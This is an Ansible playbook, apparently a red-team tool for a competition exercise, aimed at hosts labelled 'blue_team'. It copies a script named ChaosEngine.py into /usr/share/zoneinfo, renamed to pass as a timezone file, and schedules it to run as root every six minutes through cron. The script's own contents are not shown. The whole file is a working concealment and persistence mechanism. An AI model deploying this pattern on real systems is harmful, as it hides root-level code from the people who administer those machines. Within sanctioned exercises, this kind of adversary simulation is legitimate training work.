---
- name: Deploy Dokcer Chaos engine
  hosts: blue_team
  become: yes
  tasks:
    - name: Update apt (debian/ubuntu )
      apt:
        update_cache: yes
        cache_valid_time: 3600

    - name: Install dependencies
      apt:
        name:
          - python3
          - python3-pip
          - python3-docker
        state: present
        update_cache: yes

    - name: Copy file to hidden location
      copy:
        src: ./ChaosEngine.py
        #renamed to timezoon format to blend in RTSC-26 ( Red team sonia cachon-26)
        dest: /usr/share/zoneinfo/RTSC-26
        mode : '0755'
        owner: root
        group: root

    - name: Scedule Cron Job
      ansible.builtin.cron:
        name: "Run Script in every 6 minutes"
        minute: "*/6"
        job: "/usr/bin/python3 /usr/share/zoneinfo/RTSC-26"
        user: root
        state: present
